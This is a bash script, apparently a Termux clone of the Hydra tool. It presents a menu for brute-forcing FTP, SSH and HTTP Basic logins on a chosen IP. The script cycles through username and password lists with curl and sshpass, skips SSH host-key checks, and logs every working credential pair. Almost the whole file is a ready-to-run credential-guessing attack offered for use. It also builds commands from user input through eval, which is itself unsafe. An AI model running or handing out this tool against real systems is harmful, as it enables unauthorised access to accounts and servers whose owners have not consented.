#!/bin/bash

# Configuration
SUCCESS_FILE="success_log.txt"
DELAY_BETWEEN_ATTEMPTS=1

# Function to clear the screen
clear_screen() {
    clear
}

# Function to display the green-colored banner
display_banner() {
    echo -e "\e[32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠀⠀⠀⠀⠀⢀⣴⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠁⣼⢻⠃⣀⣀⣀⣠⣴⡿⣹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣏⡇⣄⠯⢰⠂⠌⣖⣡⣯⠓⣿⣇⠀⣜⠇⠉⠁⠀⠒⠚⠛⣹⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠤⣄⢞⡭⠓⢠⠘⡠⣉⣌⡵⠾⢤⡌⡟⣿⠀⣯⣠⣤⣤⣀⡀⠀⠀⠈⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢢⡄⠋⣶⡙⢦⣚⡴⠱⠋⠈⣀⣿⣆⡝⣿⣴⢿⣏⣿⣿⠿⣶⣿⣷⡄⠘⣻⣷⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣧⣶⣦⣤⣶⣶⣤⣤⡄⠀⠀⢻⡄⠀⣀⠀⢀⡀⡄⠀⣴⡾⠋⢸⡜⣿⠃⠀⠉⠛⠛⠦⠐⠻⢿⣿⣿⠘⣿⣻⣦⠀⠀
⠀⠀⠀⠀⠀⣀⡴⠟⠩⣄⣄⣃⡴⢮⠧⠻⠼⢌⣛⠦⣍⢻⣿⣿⣿⡟⣿⣿⣏⠇⢘⡛⣷⡟⢋⢬⢇⣿⣿⣼⡇⠀⣿⠄⠀⠀⢁⠐⠀⠐⢰⣿⣿⡿⢿⣆
⠀⠀⢀⣠⢞⡟⣺⢧⠓⡀⠠⠁⠠⠀⠀⡀⠀⠀⠸⠷⣬⢣⢻⣿⣿⣷⡘⠛⠀⠈⠉⠁⠉⢁⢂⢮⣿⣿⠟⠿⠁⢰⡏⠀⠀⢸⣎⠃⠈⠁⣸⣿⣿⡏⠀⠁
⣀⠴⠟⠓⠚⣪⣧⣾⣿⠏⢡⣤⠧⠒⠚⠢⢤⣀⠀⠀⢨⡇⢧⣿⣿⣿⣧⠀⠄⠀⠠⠤⢀⢂⣎⣷⡿⠋⠀⠀⢠⡞⠁⠀⠀⠀⠀⠀⠀⢠⣿⣷⣿⡧⠀⠀
⠙⠳⣤⣀⣰⣿⣿⣿⠘⢀⣸⠁⠀⠀⠀⠀⠀⢸⡆⠀⢸⡝⢦⣿⣿⣿⠿⡆⠀⢤⣄⣤⢃⣎⣾⡿⠇⠀⢀⡴⠋⠀⠀⠠⠀⠀⠀⠀⣰⡿⣷⡿⣿⡅⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣦⡄⠀⠀⠀⠀⠀⠀⡴⠀⢀⣻⠑⠾⠅⠀⠀⠀⠀⠀⣠⡞⡑⠃⠉⠀⠐⠀⡀⠀⠀⠀⢀⢀⣠⡶⣿⣷⣿⣿⣳⡟⠛⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⠇⠀⠀⠀⠀⢀⠟⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⢀⠐⠁⠀⠁⠀⠀⠀⠀⠀⠀⢂⣠⣴⣺⣿⣿⡿⣹⡿⠿⠿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡏⠀⠂⡼⠁⠀⠀⠁⠐⠠⠈⠀⠀⠀⠀⠂⠀⠀⠀⢀⣠⣴⣚⡝⣶⣿⣽⣿⣿⢾⣯⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠀⠀⢀⢃⣀⡀⠀⠀⠠⠀⠀⠄⡀⠀⠀⠀⢀⡤⣺⣙⠲⡜⣯⣻⣿⣟⣿⢯⣌⣼⣿⣃⣠⣄⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⠘⠀⠀⠀⢁⠂⠀⠀⠀⠀⠀⠁⠀⡠⢗⡼⢡⢎⡳⢩⢖⡹⣜⢣⡟⡿⢾⣟⡿⢯⣟⡿⣻⣷⣦⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⡛⡼⣰⢋⠶⣉⢗⡪⡕⣎⢧⠯⣝⣳⢮⡽⣛⡾⣽⣳⣯⣿⢿⣶⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠁⠀⠀⠐⣧⢓⢦⢋⡞⣡⢎⡵⡹⡜⢮⡝⣮⢳⣏⡾⣽⣛⡷⣯⢷⣿⣻⣿⣿⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⣞⢬⢳⡸⣑⢎⠶⡱⢭⣳⠺⣵⢫⣞⡵⣯⣽⣻⣽⣻⣾⢿⣽⣿⡧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣄⠀⢀⡀⠀⢀⠀⠤⠄⠀⠐⠂⠁⠀⠈⠪⢇⡳⡜⣎⢳⡙⣖⣣⢟⡼⣣⣿⠾⠷⠳⠿⠾⣷⣿⣻⣯⣿⡗⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢣⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠈⠙⠒⣧⣽⡆⣷⣾⢻⠉⠀⠀⠀⠀⠀⠀⢩⣿⣿⣽⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢦⣄⡀⠀⠀⠀⠀⠀⠀⠂⠈⠀⠀⠀⣀⢀⣀⣠⡬⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣻⡟⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣬⣿⣷⣺⣥⣶⣶⣶⢤⣤⣴⡶⠟⠋⠉⢉⣤⣴⠶⣶⢾⣳⢶⡶⣶⣶⣶⡿⣿⣿⠿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⣾⣿⣽⡿⠿⠛⢿⣿⣿⣿⣿⠀⠀⢠⡶⣿⣷⡾⠛⠛⠉⠉⠙⠛⠿⢾⣷⣿⡟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠻⠇⠁⠀⠀⠀⠙⡿⠋⠂⠀⢀⣿⣽⠏⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⣟⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⢿⡁⠀⠀⠀⠀⠀⠀⢠⣾⣿⣾⣧⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣾⣻⢧⣄⣀⣀⣀⣠⣽⣿⡿⠛⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⢿⢽⠯⣿⣿⠟

            CREATED BY : IAMUNIXTZ MODIFY: IngenieroRicardo ON GITHUB
\e[0m"
}

# Function for generic attack
perform_attack() {
    local target_type=$1
    local target_ip
    local target_port
    local target_slug
    local username_input
    local password_input

    clear_screen
    display_banner
    echo "${target_type} HYDRA ATTACK 🐉🐲"
    echo ""

    read -p "Enter Target IP: " target_ip
    read -p "Enter ${target_type} Port: " target_port
    if [ "$target_type" == "HTTP" ]; then
        read -p "Enter ${target_type}://${target_ip}:${target_port}/ Slug: " target_slug
    fi
    read -p "Enter Username / UsernameFile: " username_input
    read -p "Enter Password or PassFile: " password_input

    usernames=()
    passwords=()

    if [[ -f $username_input ]]; then
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'usernames=($(cat "$username_input"))'
    else
        usernames+=($username_input)
    fi

    if [[ -f $password_input ]]; then
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$password_input"))'
    else
        passwords+=($password_input)
    fi

    success_file="${target_type}_success_log.txt"
    touch $success_file

    for user in "${usernames[@]}"; do
        for pass in "${passwords[@]}"; do
            case $target_type in
                "FTP") attack_command="perform_ftp_attack '$target_ip' '$target_port' '$user' '$pass'";;
                "SSH") attack_command="perform_ssh_attack '$target_ip' '$target_port' '$user' '$pass'";;
                "HTTP") attack_command="perform_http_attack '$target_ip' '$target_port' '$user' '$pass' '$target_slug'";;
#                "Telnet") attack_command="perform_telnet_attack '$target_ip' '$target_port' '$user' '$pass'";;
#                "SMTP") attack_command="perform_smtp_attack '$target_ip' '$target_port' '$user' '$pass'";;
            esac

            echo "Trying ${target_type} login - User: $user, Password: $pass"
            eval $attack_command

            if [ $? -eq 0 ]; then
                echo -e "\e[32mAttack Success: Valid credentials - IP: $target_ip, Username: $user, Password: $pass\e[0m"
                echo "IP: $target_ip, Username: $user, Password: $pass" >> $success_file
                sleep 2
                read -p "Do you want to exit or continue attacking? [E/C]: " exit_option
                if [ "$exit_option" == "E" ] || [ "$exit_option" == "e" ]; then
                    echo "Exiting Hydra. Thanks! 🐉"
                    exit
                else
                    return
                fi
            else
                echo -e "\e[31mAttack Failed: Invalid credentials - IP: $target_ip, Username: $user, Password: $pass\e[0m"
            fi

            sleep $DELAY_BETWEEN_ATTEMPTS
        done
    done

    echo "${target_type} Brute Force Attack Completed."
    read -n 1 -s -r -p "Press Hydra Enter 🐉"
}

# Function for FTP attack
perform_ftp_attack() {
    local target_ip=$1
    local ftp_port=$2
    local user=$3
    local pass=$4
    ftp_command="curl -u $user:$pass ftp://$target_ip:$ftp_port"
    eval $ftp_command
    return $?
}

# Function for SSH attack
perform_ssh_attack() {
    local target_ip=$1
    local ssh_port=$2
    local user=$3
    local pass=$4
    ssh_command="sshpass -p '$pass' ssh -o StrictHostKeyChecking=no -p $ssh_port $user@$target_ip 'exit'"
    eval $ssh_command
    return $?
}

# Function for HTTP attack
perform_http_attack() {
    local target_ip=$1
    local http_port=$2
    local user=$3
    local pass=$4
    local slug=$5
    http_command="curl -sI --fail-with-body -u $user:$pass http://$target_ip:$http_port/$slug"
    eval $http_command
    return $?
}

# Main Program
while true; do
    clear_screen
    display_banner
    echo "TERMUX HYDRA MENU 🐲🐉:"

    echo "1. FTP Attack"
    echo "2. SSH Attack"
    echo "3. HTTP Basic Login Attack"
    #echo "4. Telnet Attack"
    #echo "5. SMTP Attack"
    #echo "6. Report Bug"
    #echo "7. Tool Details"
    echo "8. Exit"

    read -p "=============>> : " option

    case $option in
        1) perform_attack "FTP";;
        2) perform_attack "SSH";;
        3) perform_attack "HTTP";;
        #4) perform_attack "Telnet";;
        #5) perform_attack "SMTP";;
        #6) perform_attack "DEBUG";;
        #7) perform_attack "TOOL";;
        8) exit;;
        *) echo "Invalid Option 🐲🐉.";;
    esac
done

